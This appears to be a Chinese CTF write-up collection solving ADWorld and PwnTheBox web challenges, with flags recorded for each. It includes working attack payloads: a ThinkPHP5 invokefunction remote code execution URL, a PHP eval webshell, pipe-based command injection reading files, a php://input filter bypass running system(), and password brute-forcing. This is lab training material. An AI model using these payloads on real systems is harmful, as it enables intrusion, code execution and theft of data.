# Web

## ADWorld

### [view_source](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5061)

直接`view-source:http://111.200.241.244:58282/`即可查看源码发现鼠标右键菜单被禁用啦。当然你也可以尝试`F12`。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Where is the FLAG</title>
</head>
<body>
<script>
document.oncontextmenu=new Function("return false")
document.onselectstart=new Function("return false")
</script>
<h1>FLAG is not here</h1>
<!-- cyberpeace{0ecea0641057535f961556bb4c0e3bd0} -->
</body>
</html>
```

------

### [robots](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5063)

`dirsearch -u http://111.200.241.244:60105/`扫描靶机发现网站目录下有个名为`robots.txt`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/5063/1.png)

访问`http://111.200.241.244:60105/robots.txt`后发现另一个文件`f1ag_1s_h3re.php`。

![](https://paper.tanyaodan.com/ADWorld/web/5063/2.png)

访问`http://111.200.241.244:60105/f1ag_1s_h3re.php`后得到`cyberpeace{4a262386808d63cf055543bc2caea780}`。

![](https://paper.tanyaodan.com/ADWorld/web/5063/3.png)

------

### [backup](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5064)

`dirsearch -u http://111.200.241.244:55833/`扫描靶机发现网站目录下有个名为`index.php.bak`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/5064/1.png)

将`index.php.bak`文件下载后用`Sublime Text`打开即可得到`Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}`。

![](https://paper.tanyaodan.com/ADWorld/web/5064/2.png)

------

### [cookie](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5065)

打开靶机后可以看到一行信息：`你知道什么是cookie吗？`用`Burp Suite`抓包后`Send to Repeater`，接着再`Send Request`即可在右侧的`Response`中看到`flag`：`cyberpeace{b40aedb023a3f5e8139db61290274fd5}`。

![](https://paper.tanyaodan.com/ADWorld/web/5065/1.png)

------

### [disabled_button](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5066)

`view-source:http://111.200.241.244:63058/`查看网页源码如下：

```html
<html>
<head>
    <meta charset="UTF-8">
    <title>一个不能按的按钮</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>一个不能按的按钮</h3>
<form action="" method="post" >
<input disabled class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth" />
</form>
</body>
</html>
```

`F12`检查按钮将`<input>`标签中的`disabled`删除掉，再点击按钮即可得到`cyberpeace{84636369beba359c6f1e0d9f304a9a6d}`。

------

### [weak_auth](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5069)

打开靶机后随便输入账号密码便会提示账号应该是`admin`。用`Burp Suite`抓包后`Send to Intruder`，在`Payload Positions`中设置`Attack type`为`Sniper`，并添加`username=admin & password=§1§`，在`Payload Set`中添加字典进行爆破，最后得到密码为`123456`。在靶机中输入账号`admin`和密码`123456`即可得到`cyberpeace{a4f2ecbfdcd552b9eb8c7a920c604556}`。

------

### [simple_php](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5072)

`PHP`代码审计题。靶机中给出的`PHP`代码如下，我直接在源码中写注释啦：

```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){  //同时满足$a==0和$a时显示flag1
    echo $flag1;
}
if(is_numeric($b)){ //
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
```

由于`PHP`是弱类型语言，所以当`$a=fuck`时`'fuck'==0`为真，可以得到`flag1`。`is_numeric()`函数用于判断变量是否为数字或数字字符串，是则返回`true`，否则返回`FALSE`，当`$b=6666r`时`is_numeric($b)`会返回真并且`'6666r'>1234`为真，从而得到`flag2`，因此直接访问`http://111.200.241.244:56134/?a=fuck&b=6666r`就能得到`Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}`。

![](https://paper.tanyaodan.com/ADWorld/web/5072/1.png)

------

### [get_post](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5062)

访问靶机可以看到：`请用GET方式提交一个名为a,值为1的变量`，访问`http://111.200.241.244:55979/?a=1`可以看到`请再以POST方式随便提交一个名为b,值为2的变量`，`F12`用`HackBar`来添加`POST`请求数据`b=2`即可得到`cyberpeace{5c2ef3d86768127bbaccfc5cb2eb143d}`。

![](https://paper.tanyaodan.com/ADWorld/web/5062/1.png)

------

### [xff_referer](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5068)

访问靶机看到提示`ip地址必须为123.123.123.123`，打开`Burp Suite`抓包，添加`X-Forwarded-For: 123.123.123.123`后`send Request`看到提示`必须来自https://www.google.com`，继续添加`Referer: https://www.google.com`即可在`Response`中看到`cyberpeace{da1117a6b680354278869a08c728e227}`。

------

### [webshell](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5070)

打开靶机看到以下信息：

```php+HTML
你会使用webshell吗？
<?php @eval($_POST['shell']);?>
```

打开`AntSword`挥动俺的蚁剑，一句话木马告诉了靶机的连接密码是`shell`，连接成功后可以看到`flag.txt`文件，查看后即可得到`cyberpeace{081245a68c219586f459156b3d8c7051}`。

![](https://paper.tanyaodan.com/ADWorld/web/5070/1.png)

------

### [command_execution](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5071)

先来简单了解一下`Command`的四种执行方式：

```
command1 & command2 ：不管command1执行成功与否，都会执行command2，并且将上一个命令的输出作为下一个命令的输入
command1 && command2 ：先执行command1执行成功后才会执行command2，若command1执行失败，则不执行command2
command1 | command2 ：只执行command2
command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)
```

然后这一题只需要无脑爆破就完事了，输入`127.0.0.1 | ls`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls
index.php
```

显然网站目录下并没有`flag`相关文件，输入`127.0.0.1 | ls /`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
sbin
srv
sys
tmp
usr
var
```

首先访问`home`来查看有无`flag`相关信息，输入`127.0.0.1 | ls /home`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls /home
flag.txt
```

好家伙！果断输入`127.0.0.1 | cat /home/flag.txt`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | cat /home/flag.txt
cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}
```

提交`cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}`即可。

------

### [simple_js](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5067)

关闭弹出来的输入框，查看靶机源码如下：

```html
<html>
<head>
    <title>JS</title>
    <script type="text/javascript">
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab  = pass_enc.split(',');
                var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
    h = window.prompt('Enter password');
    alert( dechiffre(h) );
</script>
</head>
</html>
```

编写`Python`代码来解码那一串字符串，从而得到`Cyberpeace{786OsErtk12}`。

```python
s = '\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30'
l = s.split(',')
flag = ''
for x in l:
    flag += chr(int(x))
flag = 'Cyberpeace{%s}'%flag
print(flag)  #Cyberpeace{786OsErtk12}
```

------

### [baby_web](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5411)

题目描述：`想想初始页面是哪个`。然而直接访问靶机`/index.php`会被重定向到`1.php`，那不好意思，那我只能`Burp Suite`抓包了，`Send to Repeater`后`Send Request`即可在`Response`中的`HTTP`头中看到`flag{very_baby_web}`。

![](https://paper.tanyaodan.com/ADWorld/web/5411/1.png)

------

### [Training-WWW-Robots](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4748)

靶机中给出的信息如下：

```html
In this little training challenge, you are going to learn about the Robots_exclusion_standard.
The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.
Sometimes these files reveal the directory structure instead protecting the content from being crawled.

Enjoy!
```

直接访问`http://111.200.241.244:49579/robots.txt`，可以看到以下信息：

```html
User-agent: *
Disallow: /fl0g.php

User-agent: Yandex
Disallow: *
```

访问`http://111.200.241.244:49579/fl0g.php`即可拿到`cyberpeace{abe0ddcfd221dc9db56b6551842a5fa0}`。

------

### [php_rce](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412)

这是一个远程代码执行漏洞。访问`http://111.200.241.244:62916/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`时可以成功执行`phpinfo`。访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`可以看到网站的文件目录，不过并没有`flag`信息。访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20/`可以看到靶机服务器的根目录下有一个`flag`文件，好家伙！访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag`即可得到`flag{thinkphp5_rce}`。

------

### [Web_php_include](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415)

根据靶机给出的`PHP`源码信息可知page传参`php://`会被过滤掉，不过`strstr()`函数用于查找字符串首次出现的位置，`str_replace()`函数用来替换目标字符，这两个函数都是区分大小写字母的，因此我们可以用`PHP://`来绕开这个过滤。

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

用`Burp Suite`抓包`http://111.200.241.244:56744/?page=PHP://input`添加`<?php system("ls"); ?>`即可在靶机执行`ls`命令。

![](https://paper.tanyaodan.com/ADWorld/web/5415/1.png)

可以看到网站目录下有个`fl4gisisish3r3.php`，如果直接访问的话没用，需要用`<?php system("cat fl4gisisish3r3.php"); ?>`在靶机执行`cat fl4gisisish3r3.php`命令才能得到`ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}`。

![](https://paper.tanyaodan.com/ADWorld/web/5415/2.png)

------

## PwnTheBox

### [Get](https://ce.pwnthebox.com/challenges?type=5&id=657)

打开靶机后可以看到以下内容：

```php
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';

Notice: Undefined index: what in /var/www/html/index.php on line 8
```

通过`GET` 请求获取了一个名为`what`的参数 ，当满足`$what=='flag'`时即可输出`flag`。

直接访问 `?what=flag`可以得到`flag`，提交`PTB{58625de2-2456-401e-ac43-70bd9cdefb4b}`即可。

------

### [2048](https://ce.pwnthebox.com/challenges?type=5&id=206)

打开靶机后查看源码发现`main2048.js`，查看详情发现有个`gamewin()`函数，在`Console`输入`gamewin()`后弹出提示框，提示框显示的`flag{2O48_1s_fun}`是假`flag`，真正的`flag`在`Console`的输出里，提交`HEBTUCTF{Aaenc0de_1s_FuN}`即可。
